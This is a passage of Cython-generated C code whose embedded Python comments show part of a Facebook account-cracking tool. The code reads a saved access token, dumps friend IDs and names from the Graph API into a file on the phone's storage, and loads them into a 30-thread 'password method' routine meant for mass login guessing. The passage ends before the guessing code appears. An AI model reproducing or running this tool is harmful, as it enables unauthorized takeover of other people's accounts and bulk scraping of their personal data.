              }
            }
            __pyx_t_5 = (__pyx_t_18) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_18, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_4);
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 429, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":427
 * 				id = []
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['10000','100000','1000000','156']:             # <<<<<<<<<<<<<<
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')
 */
          }

          /* "libme.pyx":426
 * 				file = open(__file , 'a')
 * 				id = []
 * 				for a in ex['friends']['data']:             # <<<<<<<<<<<<<<
 * 					if a['id'][:6] in ['10000','100000','1000000','156']:
 * 						id.append(a['id']+"|"+a['name'])
 */
        }
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        /* "libme.pyx":421
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
      }
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L28_try_end;
      __pyx_L21_error:;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

      /* "libme.pyx":430
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 				exit("  [] Warning! Check link")
 * 		file.close()
 */
      __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
      if (__pyx_t_7) {
        __Pyx_AddTraceback("libme.James.__masal__", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_11, &__pyx_t_5, &__pyx_t_8) < 0) __PYX_ERR(0, 430, __pyx_L23_except_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GOTREF(__pyx_t_8);

        /* "libme.pyx":431
 * 						file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 * 				exit("  [] Warning! Check link")             # <<<<<<<<<<<<<<
 * 		file.close()
 * 		__id=open(__file, 'r').readlines()
 */
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__40, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 431, __pyx_L23_except_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        goto __pyx_L22_exception_handled;
      }
      goto __pyx_L23_except_error;
      __pyx_L23_except_error:;

      /* "libme.pyx":421
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      goto __pyx_L1_error;
      __pyx_L22_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      __pyx_L28_try_end:;
    }

    /* "libme.pyx":418
 * 		os.system("rm -rf /sdcard/1000.txt")
 * 		__file = ("/sdcard/1000.txt")
 * 		for zx in range(__total):             # <<<<<<<<<<<<<<
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 */
  }
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":432
 * 			except(KeyError , IOError):
 * 				exit("  [] Warning! Check link")
 * 		file.close()             # <<<<<<<<<<<<<<
 * 		__id=open(__file, 'r').readlines()
 * 		print("  \033[0;97m[] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 */
  if (unlikely(!__pyx_v_file)) { __Pyx_RaiseUnboundLocalError("file"); __PYX_ERR(0, 432, __pyx_L1_error) }
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_close); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 432, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_8, function);
    }
  }
  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 432, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":433
 * 				exit("  [] Warning! Check link")
 * 		file.close()
 * 		__id=open(__file, 'r').readlines()             # <<<<<<<<<<<<<<
 * 		print("  \033[0;97m[] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump File saved in > %s"%(__file))
 */
  __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 433, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_INCREF(__pyx_v___file);
  __Pyx_GIVEREF(__pyx_v___file);
  PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v___file);
  __Pyx_INCREF(__pyx_n_s_r);
  __Pyx_GIVEREF(__pyx_n_s_r);
  PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_n_s_r);
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_8, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 433, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_readlines); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 433, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_8, function);
    }
  }
  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 433, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_v___id = __pyx_t_6;
  __pyx_t_6 = 0;

  /* "libme.pyx":434
 * 		file.close()
 * 		__id=open(__file, 'r').readlines()
 * 		print("  \033[0;97m[] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))             # <<<<<<<<<<<<<<
 * 		print("  [] Extra Dump File saved in > %s"%(__file))
 * 	def __1000__(self):
 */
  __pyx_t_9 = PyObject_Length(__pyx_v___id); if (unlikely(__pyx_t_9 == ((Py_ssize_t)-1))) __PYX_ERR(0, 434, __pyx_L1_error)
  __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 434, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_0_97m_Total_id_0_92m_s_0_97m, __pyx_t_6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 434, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (__Pyx_PrintOne(0, __pyx_t_8) < 0) __PYX_ERR(0, 434, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":435
 * 		__id=open(__file, 'r').readlines()
 * 		print("  \033[0;97m[] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump File saved in > %s"%(__file))             # <<<<<<<<<<<<<<
 * 	def __1000__(self):
 * 		try:
 */
  __pyx_t_8 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Extra_Dump_File_saved_in_s, __pyx_v___file); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 435, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (__Pyx_PrintOne(0, __pyx_t_8) < 0) __PYX_ERR(0, 435, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":407
 * 		elif __method__2__ == "3":
 * 			self.__menn__()
 * 	def __masal__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token =open('login.txt', 'r').read()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_AddTraceback("libme.James.__masal__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v___total);
  __Pyx_XDECREF(__pyx_v___file);
  __Pyx_XDECREF(__pyx_v_zx);
  __Pyx_XDECREF(__pyx_v___ids);
  __Pyx_XDECREF(__pyx_v_rex);
  __Pyx_XDECREF(__pyx_v_ex);
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_id);
  __Pyx_XDECREF(__pyx_v_a);
  __Pyx_XDECREF(__pyx_v___id);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":436
 * 		print("  \033[0;97m[] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump File saved in > %s"%(__file))
 * 	def __1000__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			file = '/storage/emulated/0/1000.txt'
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_29__1000__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_29__1000__ = {"__1000__", (PyCFunction)__pyx_pw_5libme_5James_29__1000__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_29__1000__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__1000__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_28__1000__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_28__1000__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_line = NULL;
  PyObject *__pyx_v_ask = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_uid = NULL;
  PyObject *__pyx_v_name = NULL;
  PyObject *__pyx_v_ft = NULL;
  PyObject *__pyx_v_pwx = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *(*__pyx_t_15)(PyObject *);
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  Py_ssize_t __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__1000__", 0);

  /* "libme.pyx":437
 * 		print("  [] Extra Dump File saved in > %s"%(__file))
 * 	def __1000__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			file = '/storage/emulated/0/1000.txt'
 * 			for line in open(file, 'r').readlines():
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":438
 * 	def __1000__(self):
 * 		try:
 * 			file = '/storage/emulated/0/1000.txt'             # <<<<<<<<<<<<<<
 * 			for line in open(file, 'r').readlines():
 * 				self.id.append(line.strip())
 */
      __Pyx_INCREF(__pyx_kp_s_storage_emulated_0_1000_txt);
      __pyx_v_file = __pyx_kp_s_storage_emulated_0_1000_txt;

      /* "libme.pyx":439
 * 		try:
 * 			file = '/storage/emulated/0/1000.txt'
 * 			for line in open(file, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 439, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_INCREF(__pyx_v_file);
      __Pyx_GIVEREF(__pyx_v_file);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v_file);
      __Pyx_INCREF(__pyx_n_s_r);
      __Pyx_GIVEREF(__pyx_n_s_r);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_n_s_r);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_5, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 439, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_readlines); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 439, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 439, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
        __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
        __pyx_t_8 = NULL;
      } else {
        __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 439, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 439, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      for (;;) {
        if (likely(!__pyx_t_8)) {
          if (likely(PyList_CheckExact(__pyx_t_5))) {
            if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 439, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 439, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          } else {
            if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 439, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 439, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          }
        } else {
          __pyx_t_4 = __pyx_t_8(__pyx_t_5);
          if (unlikely(!__pyx_t_4)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 439, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_4);
        }
        __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":440
 * 			file = '/storage/emulated/0/1000.txt'
 * 			for line in open(file, 'r').readlines():
 * 				self.id.append(line.strip())             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Your Path Wrong! Please Check File Path %s not found"%(file))
 */
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 440, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 440, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 440, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_11 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_t_6); if (unlikely(__pyx_t_11 == ((int)-1))) __PYX_ERR(0, 440, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "libme.pyx":439
 * 		try:
 * 			file = '/storage/emulated/0/1000.txt'
 * 			for line in open(file, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      }
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      /* "libme.pyx":437
 * 		print("  [] Extra Dump File saved in > %s"%(__file))
 * 	def __1000__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			file = '/storage/emulated/0/1000.txt'
 * 			for line in open(file, 'r').readlines():
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":441
 * 			for line in open(file, 'r').readlines():
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			exit("\n [!] Your Path Wrong! Please Check File Path %s not found"%(file))
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__1000__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_4) < 0) __PYX_ERR(0, 441, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":442
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Your Path Wrong! Please Check File Path %s not found"%(file))             # <<<<<<<<<<<<<<
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")
 */
      if (unlikely(!__pyx_v_file)) { __Pyx_RaiseUnboundLocalError("file"); __PYX_ERR(0, 442, __pyx_L5_except_error) }
      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Your_Path_Wrong_Please_Check_Fi, __pyx_v_file); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 442, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 442, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":437
 * 		print("  [] Extra Dump File saved in > %s"%(__file))
 * 	def __1000__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			file = '/storage/emulated/0/1000.txt'
 * 			for line in open(file, 'r').readlines():
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":443
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Your Path Wrong! Please Check File Path %s not found"%(file))
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))             # <<<<<<<<<<<<<<
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 */
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 443, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_7 = PyObject_Length(__pyx_t_4); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 443, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 443, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = __Pyx_PyString_Format(__pyx_kp_s_Total_id_0_91m_s_0_97m_3, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 443, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (__Pyx_PrintOne(0, __pyx_t_6) < 0) __PYX_ERR(0, 443, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":444
 * 			exit("\n [!] Your Path Wrong! Please Check File Path %s not found"%(file))
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")             # <<<<<<<<<<<<<<
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
  __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 444, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_v_ask = __pyx_t_6;
  __pyx_t_6 = 0;

  /* "libme.pyx":445
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 */
  __pyx_t_13 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_y, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 445, __pyx_L1_error)
  if (__pyx_t_13) {

    /* "libme.pyx":446
